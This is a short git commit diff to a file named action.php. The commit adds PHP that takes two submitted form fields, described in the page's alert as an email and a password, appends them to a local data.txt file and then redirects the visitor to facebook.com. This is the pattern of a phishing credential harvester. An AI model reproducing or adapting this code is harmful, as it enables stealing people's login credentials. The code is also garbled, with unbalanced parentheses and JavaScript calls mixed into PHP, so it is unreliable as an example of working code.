204d75f48a3c82c6f915968ed97fd30863206dad
Nilson323 <marvin339@outlook.de>
2017-07-16 22:32:10 +0200

    Update action.php

--- action.php
+++ action.php
@@ -1,6 +1,9 @@
 <?php
-if(field1 != "" && field2 != ""){
-  window.open('http://facebook.com/');
+$txt = "data.txt";
+if(isset($_POST['field1'] && isset($_POST['field2']){
+  $txt=$_POST['field1'].'-'.$_POST['field2'];
+  file_put_contents('data.txt',$txt."\n",FILE_APPEND);
+  window.open('http://facebook.com/'); 
 }else{
   alert("You need to enter your email and passwort"); 
 }
